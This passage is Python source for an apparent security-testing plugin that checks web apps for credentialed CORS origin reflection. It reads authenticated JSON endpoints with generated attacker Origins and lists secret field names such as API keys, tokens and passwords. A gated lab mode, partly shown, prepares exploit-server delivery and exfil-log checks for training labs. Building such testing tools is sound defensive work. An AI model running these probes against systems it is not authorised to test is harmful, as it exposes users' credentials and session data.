"""Closed root-URL-only proof for credentialed CORS origin reflection (#1293).

The runtime mode discovers a sensitive JSON endpoint from authenticated,
same-origin application pages and proves that two independently generated
browser-valid attacker origins can read the same credentialed response.  The
model cannot select the endpoint, Origin, authentication material, payload, or
exploit host.  A separate lab-only suffix may store and deliver one nonce-bound
PortSwigger-style exploit after all server-owned approval gates are present.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import json
import re
import secrets
import socket
import ssl
from html.parser import HTMLParser
from typing import Any, Dict, Iterable, List, NamedTuple, Optional, Sequence, Set, Tuple
from urllib.parse import parse_qs, quote_plus, unquote_plus, urlencode, urljoin, urlsplit

from plugin_interface import ToolPlugin
from tools.web_request_smuggling_probe import read_http_response


MODE = "credentialed-origin-reflection-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-CORS-Probe/1.0"
MAX_REQUEST_BUDGET = 48
MAX_RESPONSE_BYTES = 96_000
MAX_TARGET_CHARS = 4_096
MAX_COOKIE_CHARS = 8_192
MAX_HEADER_VALUE_CHARS = 8_192
MAX_DISCOVERY_PAGES = 5
MAX_CANDIDATES = 6
MAX_LAB_POLLS = 8
RUNTIME_LABELS = (
    "cors-root-baseline",
    "cors-route-negative-control",
    "cors-endpoint-discovery-control",
    "cors-sensitive-anonymous-control",
    "cors-sensitive-authenticated-baseline",
    "cors-same-origin-control",
    "cors-attacker-origin-primary-proof",
    "cors-attacker-origin-primary-repeat",
    "cors-attacker-origin-secondary-proof",
    "cors-authenticated-baseline-replay",
)
LAB_LABELS = (
    "lab-unsolved-control",
    "lab-exploit-server-discovery",
    "lab-exploit-origin-policy-proof",
    "lab-exploit-store",
    "lab-exploit-content-control",
    "lab-exploit-deliver",
    "lab-exploit-delivery-follow",
    "lab-exfil-log",
    "lab-solution-submit",
    "lab-solved-confirmation",
)
SENSITIVE_KEY_RANK = {
    "apikey": 0,
    "api_key": 0,
    "api-key": 0,
    "accesstoken": 1,
    "access_token": 1,
    "access-token": 1,
    "token": 2,
    "secret": 3,
    "clientsecret": 3,
    "client_secret": 3,
    "session": 4,
    "sessionid": 4,
    "session_id": 4,
    "credential": 5,
    "password": 6,
    "email": 7,
}
SENSITIVE_HEADER_NAMES = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
    "x-csrf-token",
    "x-xsrf-token",
}
GENERIC_ENDPOINT_FALLBACKS = (
    "/accountDetails",
    "/api/account",
    "/api/me",
    "/me",
)
UNSAFE_DISCOVERY_PATH = re.compile(
    r"(?:^|/)(?:logout|signout|delete|destroy|remove|purchase|checkout|transfer|"
    r"change-password|reset-password)(?:/|$)",
    re.I,
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
FETCH_LITERAL_RE = re.compile(
    r"(?:fetch|axios\.get)\s*\(\s*['\"]([^'\"\r\n]{1,2048})['\"]",
    re.I,
)
XHR_LITERAL_RE = re.compile(
    r"\.open\s*\(\s*['\"]GET['\"]\s*,\s*['\"]([^'\"\r\n]{1,2048})['\"]",
    re.I,
)
RECEIPT_PATH_RE = re.compile(r"(/exfil-value\?receipt=[A-Za-z0-9._~-]{8,256})")
RECEIPT_VALUE_RE = re.compile(r"(?:^|[?&\s])receipt=([A-Za-z0-9._~-]{8,256})")


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _marker(value: str) -> str:
    return f"[REDACTED sha256={_sha(value)} len={len(value)}]"


def _bounded_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(int(value), high))
    except (TypeError, ValueError):
        return default


def _origin_tuple(value: str) -> Tuple[str, str, int]:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    return (
        scheme,
        (parsed.hostname or "").lower(),
        parsed.port or (443 if scheme == "https" else 80),
    )


def _origin_value(value: str) -> str:
    parsed = urlsplit(value)
    scheme, host, port = _origin_tuple(value)
    default = 443 if scheme == "https" else 80
    formatted = f"[{host}]" if ":" in host else host
    return f"{scheme}://{formatted}{'' if port == default else f':{port}'}"


def _same_origin(left: str, right: str) -> bool:
    return _origin_tuple(left) == _origin_tuple(right)


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > MAX_TARGET_CHARS or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        return None
    return f"{_origin_value(raw)}{parsed.path or '/'}"


def _safe_path_url(base: str, candidate: str) -> Optional[str]:
    raw = str(candidate or "").strip()
    if (
        not raw
        or len(raw) > 2_048
        or any(ch in raw for ch in "\r\n\0\\")
        or raw.startswith(("javascript:", "data:", "mailto:", "tel:"))
    ):
        return None
    absolute = urljoin(base, raw)
    try:
        parsed = urlsplit(absolute)
    except ValueError:
        return None
    if (
        not _same_origin(base, absolute)
        or parsed.username
        or parsed.password
        or parsed.fragment
        or UNSAFE_DISCOVERY_PATH.search(parsed.path)
    ):
        return None
    return absolute


def _is_redirect(status: int) -> bool:
    return 300 <= int(status) <= 399


def _is_unsolved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-notsolved" in lower and "is-solved" not in lower


def _is_solved(body: str) -> bool:
    lower = str(body or "").lower()
    return "is-solved" in lower and "is-notsolved" not in lower


class _PinnedOrigin(NamedTuple):
    scheme: str
    hostname: str
    port: int
    family: int
    ip: str

    @property
    def origin(self) -> str:
        default = 443 if self.scheme == "https" else 80
        formatted = f"[{self.hostname}]" if ":" in self.hostname else self.hostname
        return f"{self.scheme}://{formatted}{'' if self.port == default else f':{self.port}'}"


class _DiscoveryParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.hrefs: List[str] = []
        self.script_srcs: List[str] = []
        self.inline_scripts: List[str] = []
        self._script: Optional[List[str]] = None

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        values = {str(name).lower(): str(value or "") for name, value in attrs}
        lower = tag.lower()
        if lower == "a" and values.get("href"):
            self.hrefs.append(values["href"].strip())
        elif lower == "script":
            if values.get("src"):
                self.script_srcs.append(values["src"].strip())
            else:
                self._script = []

    def handle_data(self, data: str) -> None:
        if self._script is not None:
            self._script.append(data)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "script" and self._script is not None:
            self.inline_scripts.append("".join(self._script))
            self._script = None


class _ExploitFormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.forms: List[Dict[str, Any]] = []
        self.hrefs: List[str] = []
        self._form: Optional[Dict[str, Any]] = None
        self._textarea: Optional[str] = None
        self._textarea_data: List[str] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        values = {str(name).lower(): str(value or "") for name, value in attrs}
        lower = tag.lower()
        if lower == "a" and values.get("href"):
            self.hrefs.append(values["href"].strip())
        if lower == "form" and self._form is None:
            self._form = {
                "method": values.get("method", "get").lower(),
                "action": values.get("action", ""),
                "fields": {},
                "actions": [],
            }
            return
        if self._form is None:
            return
        name = values.get("name", "")
        if lower == "input" and name == "formAction":
            self._form["actions"].append(values.get("value", ""))
        elif lower == "input" and name:
            self._form["fields"][name] = values.get("value", "")
        elif lower == "textarea" and name:
            self._textarea = name
            self._textarea_data = []
        elif lower in {"button", "input"} and name == "formAction":
            self._form["actions"].append(values.get("value", ""))

    def handle_data(self, data: str) -> None:
        if self._textarea is not None:
            self._textarea_data.append(data)

    def handle_endtag(self, tag: str) -> None:
        lower = tag.lower()
        if lower == "textarea" and self._form is not None and self._textarea is not None:
            self._form["fields"][self._textarea] = "".join(self._textarea_data)
            self._textarea = None
            self._textarea_data = []
        elif lower == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def _parse_discovery(body: str) -> _DiscoveryParser:
    parser = _DiscoveryParser()
    try:
        parser.feed(str(body or ""))
    except Exception:
        pass
    return parser


def _sensitive_key(name: str) -> Optional[str]:
    raw = str(name or "").strip().lower()
    compact = re.sub(r"[^a-z0-9]", "", raw)
    if raw in SENSITIVE_KEY_RANK:
        return raw
    for candidate in SENSITIVE_KEY_RANK:
        if re.sub(r"[^a-z0-9]", "", candidate) == compact:
            return candidate
    return None


def _sanitize_json(value: Any) -> Tuple[Any, List[Dict[str, Any]]]:
    found: List[Dict[str, Any]] = []

    def visit(current: Any, path: str = "$") -> Any:
        if isinstance(current, dict):
            output: Dict[str, Any] = {}
            for key, child in current.items():
                name = str(key)
                child_path = f"{path}.{name}"
                classified = _sensitive_key(name)
                if classified is not None and isinstance(child, (str, int, float)):
                    raw = str(child)
                    if raw:
                        found.append(
                            {
                                "field": child_path,
                                "value": raw,
                                "rank": SENSITIVE_KEY_RANK[classified],
                            }
                        )
                        output[name] = _marker(raw)
                        continue
                output[name] = visit(child, child_path)
            return output
        if isinstance(current, list):
            return [visit(child, f"{path}[{index}]") for index, child in enumerate(current)]
        if isinstance(current, str):
            return EMAIL_RE.sub(lambda match: _marker(match.group(0)), current)
        return current

    return visit(value), found


def _parse_sensitive_json(observation: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    content_types = [
        value.lower()
        for name, value in observation.get("headers", [])
        if name.lower() == "content-type"
    ]
    if len(content_types) != 1 or "json" not in content_types[0]:
        return None
    try:
        parsed = json.loads(observation.get("body") or "")
    except (TypeError, ValueError, json.JSONDecodeError):
        return None
    if not isinstance(parsed, dict):
        return None
    sanitized, sensitive = _sanitize_json(parsed)
    if not sensitive:
        return None
    sensitive.sort(key=lambda row: (row["rank"], row["field"]))
    canonical = json.dumps(sanitized, ensure_ascii=False, separators=(",", ":"), sort_keys=True)
    observation["evidenceBody"] = canonical
    return {"canonical": canonical, "sensitive": sensitive, "parsed": parsed}


def _header_values(observation: Dict[str, Any], name: str) -> List[str]:
    lower = name.lower()
    return [value for key, value in observation.get("headers", []) if key.lower() == lower]


def _cors_headers_match(observation: Dict[str, Any], origin: str) -> bool:
    acao = _header_values(observation, "access-control-allow-origin")
    acac = _header_values(observation, "access-control-allow-credentials")
    return (
        len(acao) == 1
        and len(acac) == 1
        and acao[0] == origin
        and acao[0] != "*"
        and "," not in acao[0]
        and acac[0].strip().lower() == "true"
        and "," not in acac[0]
    )


class WebCorsProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:cors_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers an authenticated sensitive JSON GET endpoint from a root URL and "
            "proves credentialed arbitrary-Origin reflection using two tool-generated origins."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        owned = {"x-workflow-owned": True}
        hidden = {"x-hidden": True, "x-workflow-owned": True}
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE, **owned},
                "proofLevel": {
                    "type": "string", "enum": [RUNTIME_PROOF, LAB_PROOF],
                    "default": RUNTIME_PROOF, **owned,
                },
                "engagement": {
                    "type": "string", "enum": ["standard", "aggressive", "lab", "ctf"],
                    "default": "standard", **owned,
                },
                "discoverFromTarget": {"type": "boolean", "default": True, **owned},
                "discoveryPageBudget": {
                    "type": "integer", "minimum": 1, "maximum": MAX_DISCOVERY_PAGES,
                    "default": 5, **owned,
                },
                "candidateBudget": {
                    "type": "integer", "minimum": 1, "maximum": MAX_CANDIDATES,
                    "default": 6, **owned,
                },
                "requestBudget": {
                    "type": "integer", "minimum": 10, "maximum": MAX_REQUEST_BUDGET,
                    "default": 32, **owned,
                },
                "maxResponseBytes": {
                    "type": "integer", "minimum": 4096, "maximum": MAX_RESPONSE_BYTES,
                    "default": MAX_RESPONSE_BYTES, **owned,
                },
                "stopAfterFirstFinding": {"type": "boolean", "default": True, **owned},
                "authCookies": {"type": "string", **hidden},
                "authHeaders": {
                    "type": "object", "additionalProperties": {"type": "string"}, **hidden,
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False, **owned},
                "stateChangeApproved": {"type": "boolean", "default": False, **owned},
                "labDeliveryApproved": {"type": "boolean", "default": False, **owned},
                "solutionSubmitApproved": {"type": "boolean", "default": False, **owned},
                "allowDiscoveredExploitServer": {"type": "boolean", "default": False, **owned},
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 3,
            "domain": ["web", "api"],
            "input_type": ["url", "authenticated-session"],
            "output_type": ["findings"],
            "chainable_after": ["browser:map_app", "param:discover", "katana:"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove credentialed arbitrary-Origin reflection on sensitive JSON",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) URL without query or fragment")
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF}:
            return self._error("unsupported proofLevel", target)
        if engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported engagement", target)
        if parameters.get("discoverFromTarget", True) is not True:
            return self._error("discoverFromTarget must remain enabled", target)
        if parameters.get("stopAfterFirstFinding", True) is not True:
            return self._error("stopAfterFirstFinding must remain enabled", target)

        cookie, auth_headers, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        assert cookie is not None
        if proof_level == LAB_PROOF:
            gates = (
                engagement in {"lab", "ctf"},
                parameters.get("allowUnsafeMethods") is True,
                parameters.get("stateChangeApproved") is True,
                parameters.get("labDeliveryApproved") is True,
                parameters.get("solutionSubmitApproved") is True,
                parameters.get("allowDiscoveredExploitServer") is True,
            )
            if not all(gates):
                return self._error(
                    "lab-state-change requires lab/ctf and every server-owned approval gate",
                    target,
                )

        self._target = target
        self._cookie = cookie
        self._auth_headers = auth_headers
        self._secrets: Set[str] = {cookie, *auth_headers.values()}
        auth_entries = {"cookie": cookie}
        auth_entries.update({name.lower(): value for name, value in auth_headers.items()})
        auth_material = "\n".join(
            f"{name}:{value}" for name, value in sorted(auth_entries.items())
        )
        self._auth_context_sha = _sha(auth_material)
        self._requests = 0
        default_budget = 48 if proof_level == LAB_PROOF else 32
        self._budget = _bounded_int(parameters.get("requestBudget"), default_budget, 10, 48)
        self._page_budget = _bounded_int(
            parameters.get("discoveryPageBudget"), 5, 1, MAX_DISCOVERY_PAGES
        )
        self._candidate_budget = _bounded_int(
            parameters.get("candidateBudget"), 6, 1, MAX_CANDIDATES
        )
        self._max_body = _bounded_int(
            parameters.get("maxResponseBytes"), MAX_RESPONSE_BYTES, 4096, MAX_RESPONSE_BYTES
        )
        self._timeout = 20

        try:
            target_pin = await self._resolve_origin(target)
            self._target_pin = target_pin
            root = await self._request(target_pin, target, authenticated=True)
            if root["status"] != 200 or _is_redirect(root["status"]):
                return self._no_finding(target, proof_level, "authenticated root did not return HTTP 200")
            exploit_url = self._observed_exploit_url(root["body"], target)
            root["evidenceBody"] = self._root_evidence_body(
                solved=_is_solved(root["body"]), exploit_url=exploit_url
            )

            negative_url = urljoin(
                target_pin.origin + "/", f".xasm-cors-negative-{secrets.token_hex(12)}"
            )
            negative = await self._request(target_pin, negative_url, authenticated=True)
            if negative["status"] not in {404, 410}:
                return self._no_finding(target, proof_level, "random route did not fail closed")

            candidates, discovery_observation, discovery_source = await self._discover_candidates(
                target_pin, target
            )
            if not candidates or discovery_observation is None:
                return self._no_finding(target, proof_level, "no bounded sensitive endpoint candidate")
            primary_origin = f"https://{secrets.token_hex(12)}.xasm-cors.invalid"
            secondary_origin = f"https://{secrets.token_hex(12)}.xasm-cors.invalid"
            while secondary_origin == primary_origin:
                secondary_origin = f"https://{secrets.token_hex(12)}.xasm-cors.invalid"

            for endpoint in candidates[: self._candidate_budget]:
                proof = await self._probe_endpoint(
                    target_pin, endpoint, primary_origin, secondary_origin
                )
                if proof is None:
                    continue
                steps = [
                    self._evidence(RUNTIME_LABELS[0], root),
                    self._evidence(RUNTIME_LABELS[1], negative),
                    self._evidence(RUNTIME_LABELS[2], discovery_observation),
                    *proof["steps"],
                ]
                if tuple(step["label"] for step in steps) != RUNTIME_LABELS:
                    raise ValueError("internal runtime evidence ordering invariant failed")

                lab_result: Dict[str, Any] = {
                    "steps": [],
                    "labSolvedTransition": False,
                    "stateChangingRequestCount": 0,
                    "stateChangingMethods": [],
                }
                if proof_level == LAB_PROOF:
                    if exploit_url is None:
                        return self._no_finding(
                            target, proof_level, "lab exploit server was not observed in target root"
                        )
                    lab_result = await self._finalize_lab(
                        target_pin=target_pin,
                        target=target,
                        endpoint=endpoint,
                        root_before=root,
                        exploit_url=exploit_url,
                        proof=proof,
                    )
                    if not lab_result["labSolvedTransition"]:
                        return self._no_finding(target, proof_level, "lab solve transition was not proven")
                    steps.extend(lab_result["steps"])
                    if tuple(step["label"] for step in steps[10:]) != LAB_LABELS:
                        raise ValueError("internal lab evidence ordering invariant failed")

                sensitive = proof["sensitive"]
                verification: Dict[str, Any] = {
                    "verified": True,
                    "fallback": False,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "targetOrigin": target_pin.origin,
                    "endpointUrl": endpoint,
                    "discoverySource": discovery_source,
                    "authContextSha256": self._auth_context_sha,
                    "sensitiveField": sensitive["field"],
                    "sensitiveValueSha256": _sha(sensitive["value"]),
                    "sensitiveValueLength": len(sensitive["value"]),
                    "attackerOriginPrimary": primary_origin,
                    "attackerOriginSecondary": secondary_origin,
                    "primaryAccessControlAllowOrigin": primary_origin,
                    "primaryAccessControlAllowCredentials": "true",
                    "secondaryAccessControlAllowOrigin": secondary_origin,
                    "secondaryAccessControlAllowCredentials": "true",
                    "acaoPrimary": primary_origin,
                    "acaoSecondary": secondary_origin,
                    "acacPrimary": "true",
                    "acacSecondary": "true",
                    "anonymousControlDenied": True,
                    "actualResponseStable": True,
                    "anonymousSensitiveValueAbsent": True,
                    "authenticatedBodyStable": True,
                    "networkDestinationPreserved": True,
                    "destinationIpPinned": True,
                    "dnsResolvedOnce": True,
                    "freshConnectionPerRequest": True,
                    "redirectsFollowed": False,
                    "cookieJarUsed": False,
                    "tlsSniPreserved": target_pin.scheme == "https",
                    "requestCount": self._requests,
                    "labSolvedTransition": lab_result["labSolvedTransition"],
                    "stateChangingRequestCount": lab_result["stateChangingRequestCount"],
                    "stateChangingMethods": lab_result["stateChangingMethods"],
                    "corsEvidence": {"version": 1, "steps": steps},
                }
                for key in (
                    "exploitServerOrigin",
                    "exfilNonceSha256",
                    "exfilValueSha256",
                    "exfilValueLength",
                    "solutionAnswerSha256",
                ):
                    if key in lab_result:
                        verification[key] = lab_result[key]
                finding = self._finding(endpoint, verification)
                return {
                    "success": True,
                    "tool": self.name,
                    "target": target,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "verified": True,
                    "fallback": False,
                    "requestCount": self._requests,
                    "findings": [finding],
                    "total_findings": 1,
                    "verification": verification,
                    "summary": {
                        "verified": True,
                        "endpoint": endpoint,
                        "sensitiveField": sensitive["field"],
                        "sensitiveValueSha256": _sha(sensitive["value"]),
                        "anonymousControlDenied": True,
                        "actualResponseStable": True,
                        "acaoPrimary": primary_origin,
                        "acaoSecondary": secondary_origin,
                        "acacPrimary": "true",
                        "acacSecondary": "true",
                        "requests": self._requests,
                        "fallback": False,
                    },
                }
            return self._no_finding(
                target, proof_level, "no stable credentialed arbitrary-Origin reflection was proven"
            )
        except Exception as exc:
            return self._error(self._sanitize_text(str(exc))[:300], target)

    def _auth_context(
        self, parameters: Dict[str, Any]
    ) -> Tuple[Optional[str], Dict[str, str], Optional[str]]:
        raw_cookie = parameters.get("authCookies")
        if not isinstance(raw_cookie, str) or not raw_cookie.strip():
            return None, {}, "an active server-injected cookie session is required"
        cookie = raw_cookie.strip()
        if (
            len(cookie) > MAX_COOKIE_CHARS
            or any(ch in cookie for ch in "\r\n\0")
            or not any("=" in part for part in cookie.split(";"))
        ):
            return None, {}, "server-injected authCookies is malformed"
        raw_headers = parameters.get("authHeaders")
        if raw_headers is not None and not isinstance(raw_headers, dict):
            return None, {}, "authHeaders must be a workflow-owned object"
        headers: Dict[str, str] = {}
        for name, value in (raw_headers or {}).items():
            key = str(name or "").strip()
            text = str(value or "").strip()
            if key.lower() not in {"authorization", "x-api-key"}:
                return None, {}, "authHeaders may contain only Authorization or X-API-Key"
            if (
                not text
                or len(text) > MAX_HEADER_VALUE_CHARS
                or any(ch in key + text for ch in "\r\n\0")
            ):
                return None, {}, "server-injected Authorization is malformed"
            canonical_name = "Authorization" if key.lower() == "authorization" else "X-API-Key"
            if canonical_name in headers:
                return None, {}, "authHeaders contains a duplicate authentication header"
            headers[canonical_name] = text
        return cookie, headers, None

    async def _resolve_origin(self, url: str) -> _PinnedOrigin:
        scheme, hostname, port = _origin_tuple(url)
        addresses = await asyncio.wait_for(
            asyncio.get_running_loop().getaddrinfo(
                hostname, port, type=socket.SOCK_STREAM
            ),
            timeout=self._timeout,
        )
        if not addresses:
            raise ValueError("DNS resolution returned no target address")
        family, _type, _proto, _canon, sockaddr = addresses[0]
        return _PinnedOrigin(scheme, hostname, port, family, str(sockaddr[0]))

    async def _request(
        self,
        pin: _PinnedOrigin,
        url: str,
        *,
        method: str = "GET",
        authenticated: bool = False,
        origin: Optional[str] = None,
        form: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        if not _same_origin(pin.origin, url):
            raise ValueError("request left its pinned origin")
        if authenticated and pin is not self._target_pin:
            raise ValueError("target authentication cannot be forwarded cross-origin")
        method = method.upper()
        if method not in {"GET", "POST"}:
            raise ValueError("unsupported HTTP method")
        parsed = urlsplit(url)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        host_header = pin.hostname
        default_port = 443 if pin.scheme == "https" else 80
        if pin.port != default_port:
            host_header += f":{pin.port}"
        body = b""
        if form is not None:
            if method != "POST":
                raise ValueError("form body is allowed only for POST")
            body = urlencode(form).encode("utf-8")
        lines = [
            f"{method} {path} HTTP/1.1",
            f"Host: {host_header}",
            f"User-Agent: {USER_AGENT}",
            "Accept: text/html, application/json;q=0.9, */*;q=0.5",
            "Accept-Encoding: identity",
            "Cache-Control: no-store",
            "Connection: close",
        ]
        if origin is not None:
            if not re.fullmatch(r"https?://[A-Za-z0-9.-]+(?::[0-9]{1,5})?", origin):
                raise ValueError("generated Origin failed validation")
            lines.append(f"Origin: {origin}")
        if authenticated:
            lines.append(f"Cookie: {self._cookie}")
            lines.extend(f"{name}: {value}" for name, value in self._auth_headers.items())
        if body:
            lines.extend(
                [
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {len(body)}",
                ]
            )
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8") + body
        context = ssl.create_default_context() if pin.scheme == "https" else None
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host=pin.ip,
                port=pin.port,
                family=pin.family,
                ssl=context,
                server_hostname=pin.hostname if context else None,
            ),
            timeout=self._timeout,
        )
        self._requests += 1
        try:
            writer.write(raw)
            await writer.drain()
            response = await read_http_response(reader, self._timeout)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass
        body_bytes = bytes(response.get("bodyBytes") or b"")
        if len(body_bytes) > self._max_body:
            raise ValueError("response exceeded bounded body limit")
        return {
            "url": url,
            "method": method,
            "rawRequest": raw.decode("utf-8", "replace"),
            "status": int(response.get("status") or 0),
            "headers": list(response.get("headers") or []),
            "body": str(response.get("body") or ""),
            "bodyBytes": body_bytes,
            "authenticated": authenticated,
        }

    async def _discover_candidates(
        self, pin: _PinnedOrigin, target: str
    ) -> Tuple[List[str], Optional[Dict[str, Any]], str]:
        queue: List[Tuple[str, str]] = [(target, "authenticated-root")]
        seen: Set[str] = set()
        target_parts = urlsplit(target)
        candidates: List[Tuple[str, str]] = (
            [(target, "server-derived-entrypoint")]
            if (target_parts.path not in {"", "/"} or bool(target_parts.query))
            else []
        )
        last: Optional[Dict[str, Any]] = None
        source = ""
        pages = 0
        while queue and pages < self._page_budget:
            page_url, page_source = queue.pop(0)
            if page_url in seen:
                continue
            seen.add(page_url)
            observation = await self._request(pin, page_url, authenticated=True)
            pages += 1
            if observation["status"] != 200 or _is_redirect(observation["status"]):
                continue
            last = observation
            parser = _parse_discovery(observation["body"])
            scripts = list(parser.inline_scripts)
            for script in scripts:
                for raw in [*FETCH_LITERAL_RE.findall(script), *XHR_LITERAL_RE.findall(script)]:
                    endpoint = _safe_path_url(target, raw)
                    if endpoint and endpoint not in [item[0] for item in candidates]:
                        candidates.append((endpoint, f"inline-script:{urlsplit(page_url).path or '/'}"))
            if candidates:
                source = candidates[0][1]
                return [item[0] for item in candidates[: self._candidate_budget]], last, source
            for raw in parser.script_srcs[:20]:
                script_url = _safe_path_url(target, raw)
                if script_url and script_url not in seen:
                    queue.append((script_url, f"script-src:{urlsplit(page_url).path or '/'}"))
            for raw in parser.hrefs[:100]:
                link = _safe_path_url(target, raw)
                if not link or link in seen or urlsplit(link).query:
                    continue
                path = urlsplit(link).path.lower()
                if path == "/accountdetails":
                    candidates.append((link, f"observed-link:{urlsplit(page_url).path or '/'}"))
                elif len(queue) < self._page_budget * 4:
                    queue.append((link, f"observed-link:{urlsplit(page_url).path or '/'}"))
            if candidates:
                source = candidates[0][1]
                return [item[0] for item in candidates[: self._candidate_budget]], last, source
        for fallback in GENERIC_ENDPOINT_FALLBACKS:
            endpoint = _safe_path_url(target, fallback)
            if endpoint and endpoint not in [item[0] for item in candidates]:
                candidates.append((endpoint, f"fallback-catalog:{fallback}"))
        if candidates and last is not None:
            source = candidates[0][1]
            return [item[0] for item in candidates[: self._candidate_budget]], last, source
        return [], last, ""

    async def _probe_endpoint(
        self,
        pin: _PinnedOrigin,
        endpoint: str,
        primary_origin: str,
        secondary_origin: str,
    ) -> Optional[Dict[str, Any]]:
        anonymous = await self._request(pin, endpoint, authenticated=False)
        baseline = await self._request(pin, endpoint, authenticated=True)
        same_origin = await self._request(
            pin, endpoint, authenticated=True, origin=pin.origin
        )
        primary = await self._request(
            pin, endpoint, authenticated=True, origin=primary_origin
        )
        primary_repeat = await self._request(
            pin, endpoint, authenticated=True, origin=primary_origin
        )
        secondary = await self._request(
            pin, endpoint, authenticated=True, origin=secondary_origin
        )
        replay = await self._request(pin, endpoint, authenticated=True)
        observations = [anonymous, baseline, same_origin, primary, primary_repeat, secondary, replay]
        if any(_is_redirect(item["status"]) for item in observations):
            return None
        if any(item["status"] != 200 for item in observations[1:]):
            return None
        parsed = [_parse_sensitive_json(item) for item in observations[1:]]
        if any(item is None for item in parsed):
            return None
        assert all(item is not None for item in parsed)
        baseline_json = parsed[0]
        assert baseline_json is not None
        sensitive = baseline_json["sensitive"][0]
        canonical = baseline_json["canonical"]
        if any(item["canonical"] != canonical for item in parsed[1:] if item is not None):
            return None
        digest = _sha(sensitive["value"])
        for item in parsed[1:]:
            assert item is not None
            if not any(_sha(row["value"]) == digest for row in item["sensitive"]):
                return None
        anonymous_json = _parse_sensitive_json(anonymous) if anonymous["status"] == 200 else None
        if anonymous_json is not None:
            if anonymous_json["canonical"] == canonical:
                return None
            if any(_sha(row["value"]) == digest for row in anonymous_json["sensitive"]):
                return None
        if sensitive["value"] in anonymous.get("body", ""):
            return None
        if not (
            _cors_headers_match(same_origin, pin.origin)
            and
            _cors_headers_match(primary, primary_origin)
            and _cors_headers_match(primary_repeat, primary_origin)
            and _cors_headers_match(secondary, secondary_origin)
        ):
            return None
        projected_field = str(sensitive["field"]).removeprefix("$.")
        sensitive = {**sensitive, "field": projected_field}
        self._secrets.add(sensitive["value"])
        projected_body = json.dumps(
            {projected_field: _marker(sensitive["value"])},
            ensure_ascii=False,
            separators=(",", ":"),
            sort_keys=True,
        )
        for observation in observations[1:]:
            observation["evidenceBody"] = projected_body
        return {
            "sensitive": sensitive,
            "canonical": canonical,
            "steps": [
                self._evidence(RUNTIME_LABELS[3], anonymous),
                self._evidence(RUNTIME_LABELS[4], baseline),
                self._evidence(RUNTIME_LABELS[5], same_origin),
                self._evidence(RUNTIME_LABELS[6], primary),
                self._evidence(RUNTIME_LABELS[7], primary_repeat),
                self._evidence(RUNTIME_LABELS[8], secondary),
                self._evidence(RUNTIME_LABELS[9], replay),
            ],
        }

    def _observed_exploit_url(self, body: str, target: str) -> Optional[str]:
        parser = _parse_discovery(body)
        for raw in parser.hrefs[:100]:
            try:
                absolute = urljoin(target, raw)
                parsed = urlsplit(absolute)
            except ValueError:
                continue
            host = (parsed.hostname or "").lower()
            if _same_origin(target, absolute):
                continue
            if host.endswith(".exploit-server.net") or host.endswith(".lab"):
                return _origin_value(absolute) + "/"
        return None

    def _valid_lab_pair(self, target: str, exploit: str) -> bool:
        target_parts = urlsplit(target)
        exploit_parts = urlsplit(exploit)
        target_host = (target_parts.hostname or "").lower()
        exploit_host = (exploit_parts.hostname or "").lower()
        if _same_origin(target, exploit):
            return False
        public_pair = (
            target_parts.scheme == "https"
            and exploit_parts.scheme == "https"
            and target_host.endswith(".web-security-academy.net")
            and exploit_host.endswith(".exploit-server.net")
        )
        fixture_pair = (
            target_parts.scheme == "http"
            and exploit_parts.scheme == "http"
